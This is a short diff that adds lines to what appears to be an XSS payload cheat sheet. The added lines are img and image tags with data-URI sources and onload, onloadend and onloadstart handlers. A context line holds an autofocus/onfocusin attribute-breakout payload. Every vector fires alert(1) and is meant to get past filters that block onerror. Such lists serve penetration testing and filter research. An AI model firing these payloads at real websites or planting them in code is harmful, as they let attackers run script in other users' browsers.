@@ -71,3 +71,11 @@ https://infosecwriteups.com/chaining-self-xss-with-ui-redressing-is-leading-to-s
 </script>
 
 "autofocus onfocusin=alert(1) //
+Use to trigger image vectors with event handlers different than onerror.
+<img
+<image
+src=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=
+srcset=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=
+onload=alert(1)>
+onloadend=alert(1)>
+onloadstart=alert(1)>
